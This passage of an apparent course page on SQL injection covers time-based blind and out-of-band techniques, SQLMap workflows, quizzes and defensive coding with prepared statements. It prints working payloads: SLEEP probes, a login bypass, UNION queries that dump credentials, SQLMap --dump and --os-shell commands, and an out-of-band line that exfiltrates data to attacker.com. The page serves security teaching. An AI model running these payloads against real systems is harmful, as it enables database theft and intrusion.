+    <div class="qa-num-badge">08</div>
+    <div class="qa-question">Q2 (True/False). In boolean-based blind injection, the attacker reconstructs values character by character using LIKE and a true/false signal.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>True.</strong> The signal may be a <code class='icode'>taken</code> field, a redirected page, an HTTP status code, or any other binary indicator.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-9">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">09</div>
+    <div class="qa-question">Q3. Why does the attacker append AND COLUMN_NAME != &#x27;id&#x27; (and similar) to each new column probe?</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>Each LIKE probe returns true for <em>any</em> column name matching the pattern, including ones already discovered. Excluding known columns ensures the next true response must come from a <strong>new</strong> column, allowing systematic enumeration.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-6" class="content-card section-card" data-section-num="06">
+<div class="section-card-header">
+  <div class="sec-num-badge">06</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 06</span>
+    <h2 class="section-heading">Part 4 — Time-Based Blind and Out-of-Band Injection</h2>
+  </div>
+  <a class="anchor-link" href="#section-6" title="Link to section">#</a>
+</div><h3 id="sec-6-timebased"><strong>Time-Based Blind SQL Injection</strong></h3><p>When there is no visible true/false signal, the attacker uses <code class='icode'>SLEEP(x)</code> inside a UNION SELECT. SLEEP only executes if the injected query runs, so a delay confirms the injection worked.</p><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — Time-based blind probes</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">-- Wrong column count (no delay — query failed silently):
+admin123&#x27; UNION SELECT SLEEP(5);--
+
+-- Correct column count (5-second delay — injection succeeded, 2 columns):
+admin123&#x27; UNION SELECT SLEEP(5),2;--
+
+-- Combined with LIKE to enumerate the database name:
+referrer=admin123&#x27; UNION SELECT SLEEP(5),2 WHERE database() LIKE &#x27;u%&#x27;;--
+-- A 5-second delay confirms the database name starts with &#x27;u&#x27;.</pre></div>
+</div><h3 id="sec-6-oob"><strong>Out-of-Band (OOB) SQL Injection</strong></h3><p>OOB is used when the application never returns query results to the attacker. Data leaves through a <em>side channel</em>. It requires specific database server features and uses two separate channels.</p><ol><li><strong>Attack delivery:</strong> Attacker sends injection payload to the vulnerable site (e.g., as a web request).</li><li><strong>Victim database → outbound call:</strong> Payload forces the DB server to make an HTTP or DNS request to an attacker-controlled server, carrying data in the URL or hostname.</li><li><strong>Attacker callback:</strong> Attacker monitors DNS/HTTP requests arriving at their own machine — each request leaks a piece of data.</li></ol><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — OOB via DNS (MySQL example)</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">SELECT ... INTO OUTFILE &#x27;\\attacker.com\exfil.txt&#x27;
+-- or use LOAD_FILE() with a UNC path on Windows
+-- triggers DNS lookup to attacker.com, leaking data in the subdomain
+-- Requires: file privileges + network egress not blocked</pre></div>
+</div><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 4</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 4 Quiz</span><span class="quiz-desc">3 questions</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-10">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">10</div>
+    <div class="qa-question">Q1. When probing with UNION SELECT SLEEP(5),2;-- causes a ~5 second delay, what does this confirm? A) The server is offline  B) The injection succeeded and the table has two columns  C) The password is 5 characters  D) Nothing
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>B.</strong> SLEEP() only executes when the UNION SELECT is valid, so the 5-second delay confirms both a successful injection <em>and</em> a two-column table.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-11">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">11</div>
+    <div class="qa-question">Q2 (True/False). Out-of-band SQL injection uses a single communication channel for both attack delivery and result retrieval.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>False.</strong> OOB uses <strong>two separate channels</strong>: one to launch the attack (e.g., a web request) and another to gather results (e.g., DNS/HTTP callbacks to an attacker-controlled server).</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-12">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">12</div>
+    <div class="qa-question">Q3. Give two reasons why time-based blind injection is the technique of last resort.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>(1) <strong>Extremely slow</strong> — each character probe costs at least SLEEP(x) seconds; enumerating a full table can take hours. (2) <strong>Unreliable</strong> — network latency and server load introduce jitter that can produce false positives or negatives.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-7" class="content-card section-card" data-section-num="07">
+<div class="section-card-header">
+  <div class="sec-num-badge">07</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 07</span>
+    <h2 class="section-heading">Taxonomy Recap</h2>
+  </div>
+  <a class="anchor-link" href="#section-7" title="Link to section">#</a>
+</div><p>The lecture organizes SQL injection into three families based on feedback mechanism. In-band uses the same channel for exploit and result. Blind has no direct feedback. Out-of-band uses a different channel.</p><div class="table-responsive"><table>
+<thead><tr><th>Category</th><th>Sub-type</th><th>Feedback</th><th>Detection Difficulty</th><th>Typical Use</th></tr></thead>
+<tbody>
+<tr class="row-highlight-blue"><td><span class="badge badge-scan">In-band</span></td><td>Error-based</td><td>Raw DB error messages</td><td><span class="badge badge-http-200">Easy</span></td><td>Schema enumeration, DBMS fingerprinting</td></tr>
+<tr class="row-highlight-blue"><td><span class="badge badge-scan">In-band</span></td><td>Union-based</td><td>Extra rows in application output</td><td><span class="badge badge-http-300">Easy–Medium</span></td><td>Bulk data extraction — most common technique</td></tr>
+<tr class="row-highlight-amber"><td><span class="badge badge-active">Blind</span></td><td>Boolean-based</td><td>True/false signal (page content, status)</td><td><span class="badge badge-http-400">Medium</span></td><td>Character-by-character credential enumeration</td></tr>
+<tr class="row-highlight-amber"><td><span class="badge badge-active">Blind</span></td><td>Time-based</td><td>Response delay (SLEEP)</td><td><span class="badge badge-critical">Hard</span></td><td>Last resort when no other feedback exists</td></tr>
+<tr class="row-highlight-rose"><td><span class="badge badge-blackhat">Out-of-band</span></td><td>DNS/HTTP callback</td><td>External callback to attacker server</td><td><span class="badge badge-http-500">Hardest</span></td><td>Exfiltration when app never returns results</td></tr>
+</tbody></table></div><div class="callout callout-lesson">
+  <div class="callout-icon">💡</div>
+  <div class="callout-body">
+    <div class="callout-badge">KEY INSIGHT</div>
+    <div class="callout-text">The further down the table, the harder the attack is to detect. Time-based and OOB attacks often produce <strong>no application logs at all</strong>.</div>
+  </div>
+</div>
+</section>
+<section id="section-8" class="content-card section-card" data-section-num="08">
+<div class="section-card-header">
+  <div class="sec-num-badge">08</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 08</span>
+    <h2 class="section-heading">Part 5 — Automating with SQLMap</h2>
+  </div>
+  <a class="anchor-link" href="#section-8" title="Link to section">#</a>
+</div><p>SQLMap is an open-source penetration testing tool that automates detection and exploitation of SQL injection vulnerabilities. The lecture stresses it uses the <em>same techniques</em> taught in Parts 2–4 — understand the manual logic, don&#x27;t treat it as a black box.</p><h3 id="sec-8-workflow"><strong>Four-Step Workflow</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Step</th><th>What SQLMap Does</th><th>Key Options</th></tr></thead>
+<tbody><tr><td>1. Target</td><td>Points at the suspect URL or POST request.</td><td><code class="icode">-u &quot;&lt;url&gt;&quot;</code>, <code class="icode">--data=&quot;...&quot;</code></td></tr>
+<tr><td>2. Fingerprint</td><td>Identifies the DBMS and working injection technique.</td><td><code class="icode">--dbms=mysql</code> skips this step</td></tr>
+<tr><td>3. Enumerate</td><td>Walks databases, then tables, then columns.</td><td><code class="icode">--dbs</code>, <code class="icode">-D &lt;db&gt; --tables</code>, <code class="icode">-T &lt;tbl&gt; --columns</code></td></tr>
+<tr><td>4. Dump</td><td>Extracts row data from the chosen table.</td><td><code class="icode">--dump</code> (results saved as CSV)</td></tr>
+</tbody>
+</table></div><h3 id="sec-8-commands"><strong>Command Reference</strong></h3><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQLMap — Command reference</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code"># Basic target test (GET)
+sqlmap -u &quot;http://target.thm/blog?id=1&quot;
+
+# POST request with body
+sqlmap -u &quot;http://target.thm/login&quot; --data=&quot;username=admin&amp;password=test&quot;
+
+# List databases
+sqlmap -u &quot;&lt;url&gt;&quot; --dbs
+
+# List tables in a database
+sqlmap -u &quot;&lt;url&gt;&quot; -D sqli_one --tables
+
+# List columns in a table
+sqlmap -u &quot;&lt;url&gt;&quot; -D sqli_one -T staff_users --columns
+
+# Dump table data
+sqlmap -u &quot;&lt;url&gt;&quot; -D sqli_one -T staff_users --dump</pre></div>
+</div><h3 id="sec-8-flags"><strong>Useful Flags</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Flag</th><th>Meaning</th></tr></thead>
+<tbody><tr><td>--batch</td><td>Accepts default answers; runs non-interactively.</td></tr>
+<tr><td>--level=1..5</td><td>Thoroughness of test. Higher levels try more payloads.</td></tr>
+<tr><td>--risk=1..5</td><td>Aggressiveness of payloads.</td></tr>
+<tr><td>--dbms=mysql</td><td>Skips DBMS fingerprinting.</td></tr>
+<tr><td>--cookie=&quot;PHPSESSID=...&quot;</td><td>Runs an authenticated scan using a session cookie.</td></tr>
+<tr><td>--os-shell</td><td>Opens an interactive OS shell, if the DBMS allows it.</td></tr>
+</tbody>
+</table></div><h3 id="sec-8-mapping"><strong>How SQLMap Maps to Manual Techniques</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Manual Technique</th><th>Part</th><th>By Hand</th><th>SQLMap Equivalent</th></tr></thead>
+<tbody><tr><td>In-band, error-based</td><td>2</td><td>Inject a quote and read the raw DBMS error.</td><td>Sends error-probing payloads and parses error strings to identify the DBMS.</td></tr>
+<tr><td>In-band, union-based</td><td>2</td><td>Count columns with UNION SELECT, then inject database() and group_concat().</td><td>Auto-detects column count, then runs the same information_schema queries in a loop.</td></tr>
+<tr><td>Blind, boolean-based</td><td>3</td><td>Walk true/false responses character by character with LIKE.</td><td>Uses binary-search comparisons with LIKE patterns to enumerate faster than a human.</td></tr>
+<tr><td>Blind, time-based</td><td>4</td><td>Inject SLEEP(x) and measure response time.</td><td>Compares baseline and probe response times to statistically confirm delays.</td></tr>
+</tbody>
+</table></div><div class="callout callout-exam">
+  <div class="callout-icon">⚠️</div>
+  <div class="callout-body">
+    <div class="callout-badge">COMMON MISTAKE</div>
+    <div class="callout-text">When SQLMap reports 'target appears NOT injectable,' the reason is usually that the manual technique it tried requires a higher <code class='icode'>--level</code> or <code class='icode'>--risk</code> setting. Knowing the manual logic tells you which flag to raise.</div>
+  </div>
+</div><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 5</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 5 Quiz</span><span class="quiz-desc">3 questions</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-13">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">13</div>
+    <div class="qa-question">Q1. Which SQLMap command correctly lists tables inside a database named sqli_one?  A) sqlmap -u &quot;&lt;url&gt;&quot; --tables sqli_one  B) sqlmap -u &quot;&lt;url&gt;&quot; -D sqli_one --tables  C) sqlmap -u &quot;&lt;url&gt;&quot; -T sqli_one --tables  D) sqlmap -u &quot;&lt;url&gt;&quot; --dbs -D sqli_one</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>B.</strong> <code class='icode'>-D &amp;lt;database&amp;gt;</code> selects the database, and <code class='icode'>--tables</code> lists its tables.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-14">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">14</div>
+    <div class="qa-question">Q2 (True/False). SQLMap treats SQL injection detection as a black box with a fixed set of generic payloads.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>False.</strong> SQLMap systematically attempts error-based, union-based, boolean-based blind, and time-based blind techniques — the same logic taught in Parts 2–4.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-15">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">15</div>
+    <div class="qa-question">Q3. A student runs sqlmap with default settings against a blind injection target and concludes &#x27;not vulnerable&#x27; after 30 seconds. What is the most likely cause and corrective action?</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>Default <code class='icode'>--level=1</code> and <code class='icode'>--risk=1</code> may not include the time-based or boolean-based blind payloads needed. Re-run with <code class='icode'>--level=3</code> (or higher) and <code class='icode'>--risk=2</code> (or higher), and specify <code class='icode'>--dbms=mysql</code> if the DBMS is known.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-9" class="content-card section-card" data-section-num="09">
+<div class="section-card-header">
+  <div class="sec-num-badge">09</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 09</span>
+    <h2 class="section-heading">Part 6 — Remediation and Defensive Coding</h2>
+  </div>
+  <a class="anchor-link" href="#section-9" title="Link to section">#</a>
+</div><div class="callout callout-principle">
+  <div class="callout-icon">🛡️</div>
+  <div class="callout-body">
+    <div class="callout-badge">CORE PRINCIPLE</div>
+    <div class="callout-text">Use <strong>all three techniques together</strong>. They are complementary, not interchangeable.</div>
+  </div>
+</div><h3 id="sec-9-prepared"><strong>1. Prepared Statements (Primary Defense)</strong></h3><p>The query structure is written first with placeholders (<code class='icode'>?</code>). User input is bound afterward as parameters, so the database always distinguishes code from data. Structural injection is prevented regardless of input content.</p><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">Java — Prepared Statement (primary defense)</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">// Java — PreparedStatement
+PreparedStatement stmt = conn.prepareStatement(
+    &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
+stmt.setString(1, username);
+stmt.setString(2, password);</pre></div>
+</div><h3 id="sec-9-validation"><strong>2. Allow-List Input Validation (Second Layer)</strong></h3><p>Restrict input to expected strings or formats (e.g., digits only for an ID). Validation should be a second layer — never the only defense.</p><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">Python — Allow-list validation</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code"># Python (Flask) — allow-list validation
+from flask import abort
+if not username.isalnum():
+    abort(400, &#x27;Invalid username&#x27;)
+# or use a regex allow-list
+import re
+if not re.match(r&#x27;^[a-zA-Z0-9_]{3,20}$&#x27;, username):
+    abort(400, &#x27;Invalid username format&#x27;)</pre></div>
+</div><h3 id="sec-9-escaping"><strong>3. Escaping User Input (Fallback Only)</strong></h3><p>Prepend a backslash to special characters (quotes, dollar signs, backslashes) so they are parsed as literal string content. Escaping is fragile and can be bypassed with charset tricks. Use only when prepared statements are unavailable.</p><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">PHP — addslashes() (fallback only)</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">// PHP — addslashes() fallback
+$safe = addslashes($user_input);
+// &#x27; becomes \&#x27;, &quot; becomes \&quot;, \ becomes \\</pre></div>
+</div><div class="callout callout-lesson">
+  <div class="callout-icon">🔗</div>
+  <div class="callout-body">
+    <div class="callout-badge">TIE-BACK TO WEEK 3</div>
+    <div class="callout-text">SQL injection is the flagship example of OWASP's <strong>Injection</strong> category. These defenses generalize to other injection classes covered later, such as command injection in Week 6.</div>
+  </div>
+</div><h3 id="sec-9-myths"><strong>Five Common Misconceptions (Exam Items)</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Myth</th><th>Reality</th></tr></thead><tbody>
+<tr><td>Parameterized queries and escaping quotes are equivalent defenses.</td><td>False. Prepared statements separate code from data at the <em>parser level</em>. Escaping only neutralizes specific characters and can be bypassed with charset tricks such as GBK multibyte injection.</td></tr>
+<tr><td>Blind SQL injection is not exploitable because the app shows no output.</td><td>False. Boolean-based attacks use any true/false signal, time-based attacks use latency, and OOB attacks use external callbacks.</td></tr>
+<tr><td>If SQLMap reports "not injectable," the parameter is safe.</td><td>False. Default level/risk settings may skip the needed technique. Re-test with higher settings before declaring a parameter safe.</td></tr>
+<tr><td>Disabling error messages fully prevents SQL injection.</td><td>False. Hiding errors only blocks error-based enumeration. Union, boolean, time-based, and OOB attacks all work without error output.</td></tr>
+<tr><td>A WAF rule blocking UNION SELECT stops SQL injection.</td><td>False. WAFs can be bypassed with encoding, comments, case variation, and alternative operators. Fix the root cause with prepared statements.</td></tr>
+</tbody></table></div><div class="callout callout-exam">
+  <div class="callout-icon">⚠️</div>
+  <div class="callout-body">
+    <div class="callout-badge">EXAM NOTE</div>
+    <div class="callout-text">All five misconceptions appear on the final exam as true/false items. Be ready to refute each with at least one concrete reason.</div>
+  </div>
+</div><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 6</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 6 Quiz</span><span class="quiz-desc">3 questions</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-16">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">16</div>
+    <div class="qa-question">Q1. Which remediation technique is considered the PRIMARY defense against SQL injection?  A) addslashes()  B) Disabling verbose errors  C) Prepared statements (parameterized queries)  D) Using HTTPS for the DB connection</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>C.</strong> Prepared statements separate query structure from user input, making structural injection impossible regardless of input content.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-17">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">17</div>
+    <div class="qa-question">Q2 (True/False). Escaping with addslashes() provides the same level of protection as parameterized queries.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>False.</strong> Escaping is a fragile fallback. It can be bypassed with charset tricks such as GBK multibyte injection. Parameterized queries are the primary defense.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-18">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">18</div>
+    <div class="qa-question">Q3. Explain why input validation alone is insufficient as the only defense against SQL injection.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>Input validation restricts which characters are allowed, but it does not separate query structure from data. A validated input that is still concatenated into the query can alter the structure if the allow-list is incomplete (e.g., a parameter that accepts free text for legitimate reasons). Validation must be used <strong>alongside prepared statements</strong>, never as the sole defense.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-10" class="content-card section-card" data-section-num="10">
+<div class="section-card-header">
+  <div class="sec-num-badge">10</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 10</span>
+    <h2 class="section-heading">Closing Scenario: Apply Everything</h2>
+  </div>
+  <a class="anchor-link" href="#section-10" title="Link to section">#</a>
+</div><p>A student tests two pages of a target application. <strong>Page A</strong> is a login form that returns a generic &#x27;Invalid credentials&#x27; message regardless of input (no SQL errors). <strong>Page B</strong> is a product-search page that returns a raw MySQL syntax error when given a single apostrophe.</p><h3 id="sec-10-categories"><strong>(a) Identify the Categories</strong></h3><ul><li><strong>Page A:</strong> Blind SQL injection — likely boolean-based (login success/fail is a true/false signal). Time-based may be needed if no other signal exists.</li><li><strong>Page B:</strong> In-band, error-based SQL injection, and very likely union-based as well.</li></ul><h3 id="sec-10-payloads"><strong>(b) First Payloads</strong></h3><ul><li><strong>Page A:</strong> <code class='icode'>&#x27; OR 1=1;--</code> in the password field. Query becomes <code class='icode'>WHERE username=&#x27;&#x27; AND password=&#x27;&#x27; OR 1=1;</code> — always true → login bypassed.</li><li><strong>Page B:</strong> <code class='icode'>1 UNION SELECT 1,2,3</code> — increment column count until the error stops. Then <code class='icode'>0 UNION SELECT 1,2,database()</code> confirms injection and extracts the DB name.</li></ul><h3 id="sec-10-sqlmap"><strong>(c) Confirming and Automating Page B with SQLMap</strong></h3><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQLMap — Full enumeration workflow</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code"># 1. Test the endpoint
+sqlmap -u &quot;http://target.thm/search?id=1&quot; --batch --dbms=mysql
+
+# 2. List databases
+sqlmap -u &quot;http://target.thm/search?id=1&quot; --dbs
+
+# 3. List tables
+sqlmap -u &quot;http://target.thm/search?id=1&quot; -D &lt;db_name&gt; --tables
+
+# 4. List columns
+sqlmap -u &quot;http://target.thm/search?id=1&quot; -D &lt;db_name&gt; -T &lt;table&gt; --columns
+
+# 5. Dump data
+sqlmap -u &quot;http://target.thm/search?id=1&quot; -D &lt;db_name&gt; -T &lt;table&gt; --dump
+
+# If blind extraction is needed later:
+# sqlmap ... --level=3 --risk=2</pre></div>
+</div>
+</section>
+<section id="section-11" class="content-card section-card" data-section-num="11">
+<div class="section-card-header">
+  <div class="sec-num-badge">11</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 11</span>
+    <h2 class="section-heading">Lab Preparation and Wrap-Up</h2>
+  </div>
+  <a class="anchor-link" href="#section-11" title="Link to section">#</a>
+</div><h3 id="sec-11-quickref"><strong>Union-Based Quick Reference (Lab Level 1)</strong></h3><ol><li>Count columns: <code class='icode'>1 UNION SELECT 1,2,3</code></li><li>Force empty result: <code class='icode'>0 UNION SELECT 1,2,3</code></li><li>Get database name: <code class='icode'>0 UNION SELECT 1,2,database()</code></li><li>List tables: <code class='icode'>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;DB&#x27;</code></li><li>List columns: <code class='icode'>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name=&#x27;TBL&#x27;</code></li><li>Dump credentials: <code class='icode'>0 UNION SELECT 1,2,group_concat(username,&#x27;:&#x27;,password SEPARATOR &#x27;&amp;lt;br&amp;gt;&#x27;) FROM TBL</code></li></ol><h3 id="sec-11-cheatsheet"><strong>SQLMap Cheat Sheet (Homework Room)</strong></h3><ul><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; --batch</code> — basic test</li><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; --data=&quot;user=a&amp;amp;pass=b&quot;</code> — POST body</li><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; --dbs</code> — list databases</li><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; -D &amp;lt;db&amp;gt; --tables</code> — list tables</li><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; -D &amp;lt;db&amp;gt; -T &amp;lt;tbl&amp;gt; --columns</code> — list columns</li><li><code class='icode'>sqlmap -u &quot;&amp;lt;url&amp;gt;&quot; -D &amp;lt;db&amp;gt; -T &amp;lt;tbl&amp;gt; --dump</code> — extract data</li><li>Flags: <code class='icode'>--batch</code> <code class='icode'>--level=1..5</code> <code class='icode'>--risk=1..5</code> <code class='icode'>--dbms=mysql</code> <code class='icode'>--cookie=&quot;...&quot;</code> <code class='icode'>--os-shell</code></li></ul><h3 id="sec-11-pitfalls"><strong>Common Pitfalls</strong></h3><ul><li>Some engines require a trailing space after the <code class='icode'>--</code> comment marker (write <code class='icode'>-- </code>, not just <code class='icode'>--</code>).</li><li>Miscounting UNION columns produces a misleading error, not a clean confirmation.</li><li>Running SQLMap at default <code class='icode'>--level</code> and <code class='icode'>--risk</code> against a blind target and concluding &#x27;not vulnerable&#x27; too early. Raise to <code class='icode'>--level=3 --risk=2</code> or higher.</li><li>⛔ Attempting exploitation against production systems without explicit written authorization. This is <strong>illegal and unethical</strong>.</li><li>Treating SQLMap as a black box — confirm at least one finding manually to validate the report.</li></ul><h3 id="sec-11-deliverable"><strong>Tutorial Deliverable</strong></h3><ol><li>Given a target URL and captured login request (HTTP POST), manually identify the SQL injection category: error-based, union-based, boolean-based, time-based, or out-of-band.</li><li>Extract one piece of data manually, such as the database name.</li><li>Confirm and automate full extraction with SQLMap using the correct flags.</li></ol><div class="callout callout-exam">
+  <div class="callout-icon">📋</div>
+  <div class="callout-body">
+    <div class="callout-badge">DELIVERABLE</div>
+    <div class="callout-text">A one-page lab report with payloads and screenshots.</div>
+  </div>
+</div><h3 id="sec-11-terms"><strong>Key Terms</strong></h3><p>DBMS, table, column, row, primary key, UNION, information_schema, group_concat(), SLEEP(), prepared statement, allow-list, escaping.</p><h3 id="sec-11-reading"><strong>Suggested Reading</strong></h3><ul><li>OWASP SQL Injection Prevention Cheat Sheet</li><li>Official SQLMap usage documentation</li></ul>
+</section>
+<section id="section-12" class="content-card section-card" data-section-num="12">
+<div class="section-card-header">
+  <div class="sec-num-badge">12</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 12</span>
+    <h2 class="section-heading">Points to Double-Check</h2>
+  </div>
+  <a class="anchor-link" href="#section-12" title="Link to section">#</a>
+</div><div class="callout callout-exam">
+  <div class="callout-icon">⚠️</div>
+  <div class="callout-body">
+    <div class="callout-badge">BEFORE THE EXAM</div>
+    <div class="callout-text">The following items in the lecture deck are inconsistent or worth verifying before you rely on them.</div>
+  </div>
